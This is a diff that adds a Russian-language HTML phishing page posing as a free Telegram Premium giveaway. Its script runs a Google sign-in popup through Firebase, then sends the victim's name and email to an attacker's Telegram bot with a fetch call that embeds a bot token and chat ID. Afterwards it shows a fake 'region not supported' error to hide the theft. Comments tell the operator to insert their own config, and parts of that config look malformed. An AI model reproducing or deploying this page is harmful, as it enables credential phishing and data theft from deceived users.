@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Telegram Premium Free</title>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-auth-compat.js"></script>
+</head>
+<body style="text-align: center; font-family: sans-serif; background: #f0f2f5; padding-top: 50px;">
+
+    <div style="background: white; display: inline-block; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1);">
+        <img src="https://telegram.org/img/t_logo.png" width="80" alt="logo">
+        <h1>Получить Telegram Premium</h1>
+        <p>Нажмите на кнопку ниже, чтобы активировать подписку на год.</p>
+
+        <button id="loginBtn" style="padding: 15px 30px; font-size: 18px; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 8px; font-weight: bold;">
+            🎁 ЗАБРАТЬ ПОДАРОК
+        </button>
+    </div>
+
+    <script>
+        // --- 1. ВСТАВЬ СВОЙ FIREBASE CONFIG СЮДА ---
+        const firebaseConfig = {
+            apiKey: "AIzaSyAI5IdNFQAWp1SP61ncPNcuQBgWeqwj3fw",
+            authDomain: "project-by-linux.firebaseapp.com.firebaseapp.com",
+            projectId: "roject-by-linux",
+            storageBucket: "project-by-linux.firebasestorage.app.appspot.com",
+            messagingSenderId: "915349389312",
+            appId: "1:915349389312:web:2994098a616f8c9a6b18e5"
+        };
+        // -------------------------------------------
+
+        firebase.initializeApp(firebaseConfig);
+
+        document.getElementById('loginBtn').addEventListener('click', () => {
+            const provider = new firebase.auth.GoogleAuthProvider();
+            firebase.auth().signInWithPopup(provider).then((result) => {
+                const user = result.user;
+
+                // ТВОИ ДАННЫЕ ДЛЯ ТЕЛЕГРАМА
+                const token = "8596118462:AAFMS2zHb1f2krhk4IPhvP3LqkhQ205-yRo"; // От @BotFather
+                const chat_id = "8123844229";         // От @userinfobot
+                const text = `🎯 ЕСТЬ УЛОВ!\n👤 Имя: ${user.displayName}\n📧 Почта: ${user.email}`;
+
+                // Отправка данных в твой Telegram
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
+
+                alert("Ошибка активации: регион не поддерживается. Попробуйте позже.");
+            }).catch((error) => {
+                console.error("Ошибка:", error);
+            });
+        });
+    </script>
+</body>
+</html>
